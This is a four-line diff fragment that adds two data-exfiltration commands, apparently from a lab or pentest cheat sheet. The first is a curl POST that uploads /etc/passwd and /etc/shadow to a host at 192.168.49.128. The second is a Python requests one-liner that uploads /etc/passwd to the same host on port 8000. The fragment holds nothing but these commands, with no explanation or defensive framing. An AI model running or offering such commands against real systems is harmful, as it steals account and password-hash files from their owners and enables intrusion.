@@ -1,0 +1,4 @@
+curl -X POST http://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow'
+
+python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
+
